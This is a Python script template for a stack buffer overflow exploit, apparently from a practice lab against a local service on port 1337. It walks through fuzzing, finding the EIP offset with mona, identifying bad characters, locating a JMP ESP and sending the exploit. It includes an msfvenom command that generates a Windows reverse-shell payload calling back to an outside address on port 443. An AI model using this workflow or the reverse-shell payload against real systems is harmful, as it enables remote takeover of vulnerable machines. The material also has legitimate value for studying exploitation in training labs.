import buff


target = ("127.0.0.1", 1337)
runner = buff.Buff(target = target, prefix = "", postfix = "")


"""
FIRST CREATE WOKRING DIRECTORY!!!
!mona config -set workingfolder c:\mona\%p
"""



# ----- 1. FUZZING -----
# Crashed at 700
# runner.fuzz()



# ----- 2. Send Unique Characters -----
# Set Buffer Size
# BUFFER_SIZE = 1100
# runner.setBufferSize(BUFFER_SIZE)

# runner.sendPattern()



# ----- 3. Find EIP Offset -----
"""
!mona findmsp -distance BUFFER_SIZE
"""
# offset = buff.generator.findPatternOffset(BUFFER_SIZE, "386F4337")
# print(offset)

# Set Eip offset
# EIP_OFFSET = 634
# runner.setEipOffset(EIP_OFFSET)



# ----- 4. Find Bad Characters -----
"""
Possible: 23 24 3c 3d 83 84 ba

!mona bytearray -b "\x00"
!mona compare -f C:\mona\PROJECT_NAME\bytearray.bin -a ESP_address
"""
# runner.sendBadChars(exclude = [
#     "\x23",
# ])



# ----- 5. Send Exploit -----
"""
Find JMP ESP
!mona jmp -r esp -cpb "\x00"

Generate payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.2.211 LPORT=443 EXITFUNC=thread -b "\x00" -a x86 -f c
"""

# Set return address (in reverse)
# eip_address = ""
# runner.setEipAddress(eip_address)

# exploit = (

# )
# runner.setExploit(exploit)

# set padding
# runner.setPaddingSize(16)

# runner.sendExploit()
